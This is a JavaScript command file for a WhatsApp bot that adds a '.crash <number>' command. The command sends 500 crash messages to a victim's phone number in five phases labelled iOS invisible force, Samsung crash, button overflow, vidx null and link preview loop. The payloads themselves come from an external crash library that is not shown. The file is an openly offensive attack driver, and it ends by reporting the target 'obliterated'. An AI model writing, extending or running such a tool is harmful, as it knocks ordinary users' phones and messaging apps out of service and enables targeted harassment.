'use strict';
const { CrashLib } = require('../../lib/crashlib');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'crash',
    aliases: ['crashall', 'executeall', 'alldamage', 'maxcrash'],
    category: 'crash',
    desc: 'ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ — ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs ᴜɴʟᴇᴀsʜᴇᴅ',
    usage: '.crash <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}crash <number>\n📝 *Example:* ${prefix}crash 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        // TOTAL PAYLOAD COUNT: 500
        const TOTAL = 500;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            // ═══════════════════════════════════════════════
            // PHASE 1: IOS INVISIBLE FORCE — 100 HITS
            // ═══════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.iosInvisibleForce(target);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            // ═══════════════════════════════════════════════
            // PHASE 2: SAMSUNG CRASH — 100 HITS
            // ═══════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.samsung(target);
                await bar.update(1, 'sᴀᴍsᴜɴɢ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            // ═══════════════════════════════════════════════
            // PHASE 3: BUTTON OVERFLOW — 100 HITS
            // ═══════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.buttonOverflow(target);
                await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            // ═══════════════════════════════════════════════
            // PHASE 4: VIDX NULL V2 — 100 HITS
            // ═══════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.vidxNull(target);
                await bar.update(1, 'ᴠɪᴅx ɴᴜʟʟ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            // ═══════════════════════════════════════════════
            // PHASE 5: LINK PREVIEW LOOP — 100 HITS
            // ═══════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.linkPreviewLoop(target, msg);
                await bar.update(1, 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 200));
            }
            
            await bar.done(`✅ ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};